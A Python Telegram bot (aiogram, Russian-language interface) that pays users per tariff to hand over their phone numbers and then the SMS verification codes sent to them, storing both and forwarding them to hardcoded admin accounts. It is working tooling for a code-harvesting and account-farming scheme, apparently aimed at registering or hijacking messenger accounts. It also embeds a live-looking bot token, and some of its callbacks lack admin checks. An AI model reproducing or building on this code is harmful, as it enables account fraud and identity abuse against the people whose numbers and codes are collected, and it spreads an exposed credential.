import asyncio
import logging
import aiosqlite
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery)

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8220500651:AAHKBf-AZ3UT7kH1oOrEEl-NwDWSE4DYoWw"
ADMIN_IDS = [7323981601, 8383446699] 
CHANNEL_LINK = "https://t.me/+4K_4dildrI82ODY6"
CHANNEL_ID = -1003532318157
SUPPORT_LINK = "https://t.me/ik_126"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

WORK_STATUS = True 

# --- СОСТОЯНИЯ ---
class Form(StatesGroup):
    choosing_tariff = State()
    entering_number = State()
    entering_code = State()
    broadcasting = State()

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
        await db.execute('''CREATE TABLE IF NOT EXISTS requests 
                           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                            phone TEXT, tariff TEXT, code TEXT, status INTEGER DEFAULT 0)''')
        await db.commit()

# --- КЛАВИАТУРЫ ---
def main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📱 Сдать номер")],
        [KeyboardButton(text="📢 Канал/Чат"), KeyboardButton(text="🆘 Поддержка")]
    ], resize_keyboard=True)

def tariff_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="⚡️ 1.5$ Нерег Момент оплата")],
        [KeyboardButton(text="🌙 2.0$ вбх Выплата вечером")], # Обновил цену и название тут
        [KeyboardButton(text="🔙 Назад")]
    ], resize_keyboard=True)

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📂 Новые заявки", callback_data="admin_view_new")],
        [InlineKeyboardButton(text="✅ Start Work", callback_data="work_start"),
         InlineKeyboardButton(text="❌ Stop Work", callback_data="work_stop")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")]
    ])

# --- ПРОВЕРКА ПОДПИСКИ ---
async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_ID, user_id)
        return m.status in ['member', 'administrator', 'creator']
    except: return False

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start(message: types.Message):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('INSERT OR IGNORE INTO users VALUES (?)', (message.from_user.id,))
        await db.commit()
    if not await check_sub(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔗 Вступить", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="🔄 Проверить", callback_data="check_sub_now")]
        ])
        return await message.answer("⚠️ Подпишитесь на канал для доступа!", reply_markup=kb)
    await message.answer(f"👋 Привет! Выбирай пункт меню:", reply_markup=main_kb())

@dp.callback_query(F.data == "check_sub_now")
async def check_sub_callback(callback: CallbackQuery):
    if await check_sub(callback.from_user.id):
        await callback.message.delete()
        await callback.message.answer("✅ Доступ открыт!", reply_markup=main_kb())
    else:
        await callback.answer("❌ Вы не подписаны!", show_alert=True)

@dp.message(F.text == "🆘 Поддержка")
async def support_handler(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✍️ Написать админу", url=SUPPORT_LINK)]])
    await message.answer("Есть вопросы? Пиши мне:", reply_markup=kb)

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id in ADMIN_IDS:
        await message.answer(f"🛠 Админ-панель", reply_markup=admin_kb())

# --- ЛОГИКА РАССЫЛКИ ---

@dp.callback_query(F.data == "admin_broadcast")
async def broadcast_command(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await state.set_state(Form.broadcasting)
    await callback.message.answer("📝 **Введите текст рассылки**:\nДля отмены напишите 'отмена'", parse_mode="Markdown")
    await callback.answer()

@dp.message(Form.broadcasting)
async def perform_broadcast(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    if message.text and message.text.lower() == "отмена":
        await state.clear()
        return await message.answer("❌ Рассылка отменена.")

    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT user_id FROM users') as cursor:
            users = await cursor.fetchall()

    count = 0
    await message.answer(f"⌛ Начинаю рассылку...")
    
    for user in users:
        try:
            await message.copy_to(chat_id=user[0])
            count += 1
            await asyncio.sleep(0.05)
        except Exception: pass

    await state.clear()
    await message.answer(f"✅ Рассылка завершена! Отправлено: {count}")

# --- ЛОГИКА СДАЧИ НОМЕРА ---

@dp.message(F.text == "📱 Сдать номер")
async def rent_start(message: types.Message, state: FSMContext):
    if not WORK_STATUS:
        return await message.answer("😴 Прием номеров временно закрыт.")
    await state.set_state(Form.choosing_tariff)
    await message.answer("💵 Выберите тариф:", reply_markup=tariff_kb())

@dp.message(Form.choosing_tariff)
async def rent_tariff(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("Меню:", reply_markup=main_kb())
    await state.update_data(tariff=message.text)
    await state.set_state(Form.entering_number)
    await message.answer("📲 Введите номер (цифры):", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔙 Назад")]], resize_keyboard=True))

@dp.message(Form.entering_number)
async def rent_number(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("Меню:", reply_markup=main_kb())
        
    phone = re.sub(r'\D', '', message.text)
    if len(phone) < 7: return await message.answer("❌ Ошибка в номере.")
    data = await state.get_data()

    async with aiosqlite.connect('bot_database.db') as db:
        cursor = await db.execute('INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)', (message.from_user.id, phone, data['tariff']))
        request_id = cursor.lastrowid
        await db.commit()
    
    admin_kb_req = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Взять в работу", callback_data=f"take_{request_id}_{message.from_user.id}")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cancelreq_{request_id}_{message.from_user.id}")],
        [InlineKeyboardButton(text="💬 Чат", url=f"tg://user?id={message.from_user.id}")]
    ])

    for admin_id in ADMIN_IDS:
        await bot.send_message(admin_id, f"🆕 **Заявка #{request_id}**\n📱: `{phone}`\n💰: {data['tariff']}", parse_mode="Markdown", reply_markup=admin_kb_req)
    
    await state.clear()
    await message.answer("⏳ **Номер отправлен!** Ожидайте, скоро админ запросит код.")

# --- ВЗЯТИЕ В РАБОТУ ---

@dp.callback_query(F.data.startswith("take_"))
async def take_req(callback: CallbackQuery):
    _, req_id, user_id = callback.data.split("_")
    user_state = dp.fsm.get_context(bot, chat_id=int(user_id), user_id=int(user_id))
    await user_state.set_state(Form.entering_code)
    await bot.send_message(user_id, "🔔 **Админ взял номер!**\nВведите код из СМС ниже 👇")
    await callback.message.edit_text(callback.message.text + "\n\nСтатус: 🟡 В работе")
    await callback.answer()

@dp.callback_query(F.data.startswith("cancelreq_"))
async def cancel_req(callback: CallbackQuery):
    _, req_id, user_id = callback.data.split("_")
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('DELETE FROM requests WHERE id = ?', (req_id,))
        await db.commit()
    try: await bot.send_message(user_id, "❌ Заявка отклонена.")
    except: pass
    await callback.message.delete()
    await callback.answer("Отменено")

@dp.message(Form.entering_code)
async def code_input(message: types.Message, state: FSMContext):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('UPDATE requests SET code = ? WHERE user_id = ? AND status = 0', (message.text, message.from_user.id))
        await db.commit()
    for admin_id in ADMIN_IDS:
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💬 Чат", url=f"tg://user?id={message.from_user.id}")]])
        await bot.send_message(admin_id, f"🔑 **КОД!**\n👤 ID: `{message.from_user.id}`\n💬 Код: `{message.text}`", parse_mode="Markdown", reply_markup=kb)
    await state.clear()
    await message.answer("✅ Код передан!")

@dp.callback_query(F.data.startswith("work_"))
async def work_toggle(callback: CallbackQuery):
    global WORK_STATUS
    action = callback.data.split("_")[1]
    WORK_STATUS = (action == "start")
    msg = "🚀 **Работаем!** Принимаем номера." if WORK_STATUS else "😴 **Отдыхаем!** Прием временно закрыт."
    
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT user_id FROM users') as cursor:
            users = await cursor.fetchall()
    for u in users:
        try: await bot.send_message(u[0], msg, parse_mode="Markdown")
        except: pass
    await callback.answer(f"Статус изменен")

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
